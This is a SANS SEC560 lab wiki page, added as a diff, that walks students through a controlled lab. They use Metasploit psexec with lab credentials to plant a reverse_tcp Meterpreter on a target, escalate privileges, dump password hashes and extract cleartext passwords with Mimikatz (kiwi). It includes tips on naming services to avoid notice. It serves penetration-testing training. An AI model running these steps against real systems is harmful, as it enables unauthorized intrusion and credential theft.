@@ -1,0 +1,344 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-42-msf-pxexec-hash-dumping-and-mimikatz">Lab 4.2: MSF pxexec, hash dumping, and Mimikatz</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>To use the Metasploit <code>psexec</code> exploit module to deploy a Meterpreter payload to a target Windows machine using an authenticated SMB session</li>
+<li>To explore the Meterpreter&rsquo;s abilities to get privileges and dump hashes from a target machine</li>
+</ul>
+<h3 id="table-of-contents">Table of contents</h3>
+<ul>
+<li><a href="#setup">Lab Setup</a></li>
+<li><a href="#walkthrough">Step-by-Step Instructions</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<p><a id="setup">&nbsp;</a></p>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>Ensure that you can ping <b>10.10.10.10</b> in the 560 target environment from your Slingshot Linux image.</p>
+<pre>
+$ <b>ping 10.10.10.10</b>
+</pre>
+
+<p><a id="walkthrough">&nbsp;</a></p>
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="1-launch-metasploit">1. Launch Metasploit</h4>
+<p>Start by launching Metasploit.</p>
+<pre>
+$ <b>msfconsole</b>
+</pre>
+
+<p>Now let&rsquo;s choose the <code>psexec</code> exploit module from Metasploit, which we can use to cause a target to run a Metasploit payload:</p>
+<pre>
+msf5 > <b>use exploit/windows/smb/psexec</b>
+</pre>
+
+<p>For a payload, we&rsquo;ll use a Meterpreter stage with a <code>reverse_tcp</code> stager:</p>
+<pre>
+msf5 exploit(psexec)> <b>set PAYLOAD windows/meterpreter/reverse_tcp</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex4.2_img01.png" style="width:100%;max-width:600px"  alt="Msfconsole setting up psexec and reverse_tcp" /></p>
+<p>Next, we need to tell Metasploit the target on which it should launch <code>psexec</code>, specifically <b>10.10.10.10</b>:</p>
+<pre>
+msf5 exploit(psexec)> <b>set RHOST 10.10.10.10</b>
+</pre>
+
+<p>We now need to set the <b>LHOST</b>, where the <code>reverse_tcp</code> stager will connect back to. Set it for your own Linux IP address:</p>
+<pre>
+msf5 exploit(psexec)> <b>set <i>LHOST YOUR_LINUX_IP_ADDRESS</i></b>
+</pre>
+
+<blockquote>
+<p>Note: Do not type <code>YOUR_LINUX_IP_ADDRESS</code>; instead, type the IP address of your Linux system.</p>
+</blockquote>
+<p>Now, we&rsquo;ll configure our <code>psexec</code> exploit module with a username of <code>falken</code> and a password of <code>joshua</code>. User <code>falken</code> is in the administrators group for this machine, as we have seen earlier in this class:</p>
+<pre>
+msf5 exploit(psexec)> <b>set SMBUser falken</b>
+msf5 exploit(psexec)> <b>set SMBPass joshua</b>
+</pre>
+
+<p>Next, let&rsquo;s review the settings for our attack:</p>
+<pre>
+msf5 exploit(psexec)> <b>show options</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex4.2_img02.png" style="width:100%;max-width:600px"  alt="Psexec options" /></p>
+<p>In the section on options for <code>exploit/windows/smb/psexec</code>, we see that we can configure a <code>SERVICE_DISPLAY_NAME</code> and a <code>SERVICE_NAME</code>. Remember, <code>psexec</code> creates a service on the target machine, and these settings enable us to set the name of the service that will appear in the Service Control Panel GUI (<code>SERVICE_DISPLAY_NAME</code>) and via the <code>sc</code> command (<code>SERVICE_NAME</code>). This way, we can make our attack more subtle by choosing a name that might blend in with what is expected on a target system. If we don&rsquo;t specify a name here, Metasploit will create a service with a pseudorandom display name and service name, which might draw more attention in Windows event logs. However, note that even if we do create a subtle name that blends in with what is normally on the system (something innocuous such as plug-and-play or winlogon), the Windows event log will still show the service creation, start, stop, and deletion events.</p>
+<p>As we have seen, <code>show options</code> shows the main settings for Metasploit modules. But there are dozens of additional variables for most modules available via their advanced settings. We can see these options by running <code>show advanced</code>. Let&rsquo;s try it:</p>
+<pre>
+msf5 exploit(psexec)> <b>show advanced</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex4.2_img03.png" style="width:100%;max-width:600px"  alt="Viewing psexec more options" /></p>
+<p>Here we can see numerous options letting us specify things like the local client port (<code>CPORT</code>) to use in launching an attack, an indication of whether or not to make a persistent service that will run every time the system boots so we&rsquo;d automatically get a Meterpreter session sent back at system boot (<code>SERVICE_PERSIST</code>), and a setting of <code>SERVICE_FILENAME</code>. This variable can be set to a name that the payload file will be written into on the target machine so that the service can execute it. Again, by default, the <code>SERVICE_FILENAME</code> is a pseudorandom string. To be subtle, we may want to change that to something that is more likely to be expected on a target machine, such as <code>svchost</code>.</p>
+<p>Let's leave these options alone for now. The pseudorandom strings and the timing means that it is highly unlikly two services with the same name will be installed at the same time.</p>
+<p>Before we launch the attack, let's confirm the settings are correct by running <code>show options</code>. Below are the options for the exploit.</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img04.png" style="width:100%;max-width:600px"  alt="Exploit options (Exploit)" /></p>
+<blockquote>
+<p>Note: Your LHOST will likely be different that what is shown in the screenshot above.</p>
+</blockquote>
+<h4 id="step-2-launch-the-attack">Step 2. Launch the attack</h4>
+<p>In your Metasploit console terminal, let&rsquo;s launch the attack:</p>
+<pre>
+msf5 exploit(psexec)> <b>exploit</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex4.2_img05.png" style="width:100%;max-width:600px"  alt="Launching exploit" /></p>
+<p>Note the output displayed on the screen. We can see the following actions taken by Metasploit:</p>
+<ol>
+<li>Metasploit automatically starts a reverse handler listening on local port 4444, awaiting the <code>reverse_tcp</code> connection to come back. The default <code>LPORT</code> is <code>4444</code> for most Metasploit payloads. We could have changed that by setting the <code>LPORT</code> to some other value.</li>
+<li>It then connects to the target server.</li>
+<li>It authenticates to the target machine as user <code>falken</code>.</li>
+<li>It then recognizes that the target has PowerShell installed.</li>
+<li>It then executes the payload by starting the service.</li>
+<li>If the service starts successfully, it then sends the stage to the target (uploading it using the stager).</li>
+<li>And finally, we get a Meterpreter session.</li>
+</ol>
+<h4 id="step-3-meterpreter">Step 3. Meterpreter</h4>
+<p>Now we are inside our Meterpreter session. To see the user account we are running as, let&rsquo;s run:</p>
+<pre>
+meterpreter > <b>getuid</b>
+</pre>
+
+<p>We have local <b>SYSTEM</b> privileges on the machine. So we started with an admin username (<code>falken</code>) and password (<code>joshua</code>) and used them to get code execution as local <code>SYSTEM</code> via <code>psexec</code>. The Meterpreter also has another command called <code>getprivs</code>, which uses its existing privileges to pull in as many additional privileges as it can. We don&rsquo;t always have to run the <code>getprivs</code> command, as we often have the privileges we need to access things on a target system. But <code>getprivs</code> helps on machines that have been hardened with certain privileges removed from specific administrative accounts. Let&rsquo;s run <code>getprivs</code> and see the privileges it will grab for us:</p>
+<pre>
+meterpreter > <b>getprivs</b>
+</pre>
+
+<p>Now, with your Meterpreter session, let&rsquo;s grab the hashes from the target. We&rsquo;ll use the <code>post/windows/gather/smart_hashdump</code> module to extract password hashes from the remote system. This module is smart and will dump password hashes differently depending on the target system's role. If the target is a domain controller, it will pull passwords differently and from a dfferent location. We'll discuss this in more depth later in this course.</p>
+<pre>
+meterpreter > <b>info post/windows/gather/smart_hashdump</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex4.2_img05b.png" style="width:100%;max-width:600px"  alt="Hashdump info" /></p>
+<pre>
+meterpreter > <b>run post/windows/gather/smart_hashdump</b>
+</pre>
+
+<p>In addition, the <code>run post/windows/gather/smart_hashdump</code> command also attempts to pull password hints from the system if any users have configured their accounts with password hints.</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img06.png" style="width:100%;max-width:600px"  alt="Running hashdump" /></p>
+<p>So we successfully got hashes from the target machine, which we could then crack or use in a <i>pass-the-hash attack</i>, two topics we&rsquo;ll be covering in depth later.</p>
+<h4 id="step-4-mimikatz-kiwi">Step 4. Mimikatz (Kiwi)</h4>
+<p>Let's take a look at our current session by running <code>sysinfo</code>:</p>
+<pre>
+meterpreter > <b>sysinfo</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex4.2_img07.png" style="width:100%;max-width:600px"  alt="Sysinfo" /></p>
+<p>As we can see above, the target system is 64-bit, but the Meterpreter process itself is 32-bit. To perform this next task, we need to be in a 64-bit SYSTEM process. Let's find 64-bit SYSTEM processes on the target using the following command:</p>
+<pre>
+meterpreter > <b>ps -A x64 -s</b>
+</pre>
+
+<p>The above command will identify processes (<code>ps</code>) on the target that are 64-bit (<code>-A x64</code>) and are running with SYSTEM-level permissions (<code>-s</code>, lowercase s).</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img08.png" style="width:100%;max-width:600px"  alt="Viewing process list" /></p>
+<p>As you can see in the above output, there will be a number of 64-bit SYSTEM <code>ping.exe</code> processes. Obviously, this isn't typical, but we need extra processes to use in the next step, and if too many people use the same processes at the same time, it will cause issues. Pick one of the process IDs (<code>PID</code> column, NOT <code>PPID</code>) for use in the next command.</p>
+<p>We'll then migrate into one of the 64-bit SYSTEM processes (<code>ping.exe</code>) using the following command:</p>
+<pre>
+meterpreter > <b>migrate PROCESS_ID_OF_PING</b>
+</pre>
+
+<blockquote>
+<p>Note: Don't type <code>PROCESS_ID_OF_PING</code>; instead, type the process ID number (<code>PID</code> column) of one of the 64-bit SYSTEM ping.exe processes.</p>
+</blockquote>
+<p><img  class="myImg"  src="pics/Ex4.2_img09.png" style="width:100%;max-width:600px"  alt="Migrating ping" /></p>
+<p>Verify that your Meterpreter is 64-bit by running the command below and analyzing the <code>Meterpreter</code> line:</p>
+<pre>
+meterpreter > <b>sysinfo</b>
+</pre>
+
+<p>Your output should be similar to this:</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img10.png" style="width:100%;max-width:600px"  alt="Sysinfo" /></p>
+<p>Now that we are in a 64-bit process, we can load Mimikatz with the following command:</p>
+<pre>
+meterpreter > <b>load kiwi</b>
+</pre>
+
+<p>Your output should look similar to this:</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img11.png" style="width:100%;max-width:600px"  alt="Loading kiwi" /></p>
+<p>Let's look at the new commands available to us by running <code>help</code>:</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img12.png" style="width:100%;max-width:600px"  alt="Viewing kiwi help" /></p>
+<p>Now let's get the passwords from RAM by running the following command:</p>
+<pre>
+meterpreter > <b>creds_all</b>
+</pre>
+
+<p>You should see output similar to this:</p>
+<p><img  class="myImg"  src="pics/Ex4.2_img13.png" style="width:100%;max-width:600px"  alt="Getting passwords from RAM" /></p>
+<p>Now we can see the hash for the Administrator account. Furthermore, we can see the cleartext password for the Administrator account because it was loaded into memory. For that target machine, the Administrator password is <code>sansnight</code>.</p>
+<h4 id="step-4-wrapping-up">Step 4. Wrapping up</h4>
+<p>To finish this lab, exit your Meterpreter session with target <b>10.10.10.10</b>:</p>
+<pre>
+meterpreter > <b>exit</b>
+</pre>
+
+<p>Again, keep Metasploit open; we'll use this configuration again.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this lab, we&rsquo;ve run the Metasploit <code>psexec</code> module, looking at its configuration options and analyzing its step-by-step activities to gain code execution on a target machine. We used <code>psexec</code> to run a <code>meterpreter/reverse_tcp</code> payload on the target with local <code>SYSTEM</code> privileges, which we then employed to seize additional privileges and to gather hashes via the <code>post/windows/gather/smart_hashdump</code> module. Additionally, we can gather cleartext credentials for logged-in users with Mimikatz (kiwi). Each of these capabilities is highly useful in a penetration test.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
